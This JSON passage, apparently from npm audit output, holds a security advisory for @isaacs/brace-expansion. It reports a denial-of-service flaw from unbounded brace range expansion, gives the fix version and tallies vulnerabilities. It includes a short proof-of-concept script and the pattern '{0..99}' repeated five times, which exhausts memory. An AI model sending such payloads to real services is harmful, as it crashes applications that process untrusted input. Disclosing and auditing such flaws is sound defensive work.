      "overview": "### Summary\n\n`@isaacs/brace-expansion` is vulnerable to a Denial of Service (DoS) issue caused by unbounded brace range expansion. When an attacker provides a pattern containing repeated numeric brace ranges, the library attempts to eagerly generate every possible combination synchronously. Because the expansion grows exponentially, even a small input can consume excessive CPU and memory and may crash the Node.js process.\n\n### Details\n\nThe vulnerability occurs because `@isaacs/brace-expansion` expands brace expressions without any upper bound or complexity limit. Expansion is performed eagerly and synchronously, meaning the full result set is generated before returning control to the caller.\n\nFor example, the following input:\n\n```\n{0..99}{0..99}{0..99}{0..99}{0..99}\n```\n\nproduces:\n\n```\n100^5 = 10,000,000,000 combinations\n```\n\nThis exponential growth can quickly overwhelm the event loop and heap memory, resulting in process termination.\n\n### Proof of Concept\n\nThe following script reliably triggers the issue.\n\nCreate `poc.js`:\n\n```js\nconst { expand } = require('@isaacs/brace-expansion');\n\nconst pattern = '{0..99}{0..99}{0..99}{0..99}{0..99}';\n\nconsole.log('Starting expansion...');\nexpand(pattern);\n```\n\nRun it:\n\n```bash\nnode poc.js\n```\n\nThe process will freeze and typically crash with an error such as:\n\n```\nFATAL ERROR: JavaScript heap out of memory\n```\n\n### Impact\n\nThis is a denial of service vulnerability. Any application or downstream dependency that uses `@isaacs/brace-expansion` on untrusted input may be vulnerable to a single-request crash.\n\nAn attacker does not require authentication and can use a very small payload to:\n\n* Trigger exponential computation\n* Exhaust memory and CPU resources\n* Block the event loop\n* Crash Node.js services relying on this library",
      "reported_by": null,
      "title": "@isaacs/brace-expansion has Uncontrolled Resource Consumption",
      "metadata": null,
      "cves": [
        "CVE-2026-25547"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "@isaacs/brace-expansion",
      "vulnerable_versions": "<=5.0.0",
      "github_advisory_id": "GHSA-7h2j-956f-4vf2",
      "recommendation": "Upgrade to version 5.0.1 or later",
      "patched_versions": ">=5.0.1",
      "updated": "2026-02-04T15:38:06.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-1333"
      ],
      "url": "https://github.com/advisories/GHSA-7h2j-956f-4vf2"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 0,
      "moderate": 1,
      "high": 7,
      "critical": 0
    },
    "dependencies": 1098,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 1098
  }
}
